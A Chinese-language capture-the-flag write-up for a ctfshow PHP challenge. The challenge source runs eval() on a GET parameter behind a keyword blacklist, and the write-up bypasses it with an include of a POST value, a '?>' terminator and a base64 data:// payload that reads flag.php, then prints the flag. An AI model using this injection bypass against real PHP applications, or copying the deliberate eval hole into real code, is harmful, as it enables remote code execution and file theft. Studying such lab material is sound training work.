```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
这题直接额外把分号`;`和小括号`(`给屏蔽了，意味着我们只能通过 GET 的 ?c= 参数传入一行 php 代码，并且空格也被屏蔽了，我们通过使用 `?>` 代替分号`;`结束语句
```php
/?c=include$_POST["d"]?>
```
写一段 php 代码读取 `flag.php`
```php
<?php highlight_file("flag.php");?>
```
Base64 编码一下（可以使用 [base64.us](https://base64.us/)、CyberChef、随波逐流编码工具等工具）
```
PD9waHAgaGlnaGxpZ2h0X2ZpbGUoImZsYWcucGhwIik7Pz4=
```
POST Body 中使用 data:// 伪协议传入这段 Base64 编码的 php 代码
```
d=data://text/plain;base64,PD9waHAgaGlnaGxpZ2h0X2ZpbGUoImZsYWcucGhwIik7Pz4=
```
使用 HackBar 填好 URL 打开 Use POST method 后点击上面的第三个按钮 `EXECUTE` 即可获得 Flag
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{d25cba9e-c18a-4f9c-be6a-93eeaa117927}";
```

<img width="2560" height="1524" alt="Image" src="https://github.com/user-attachments/assets/13a36043-97d1-4e12-aa63-678cd6196c31" />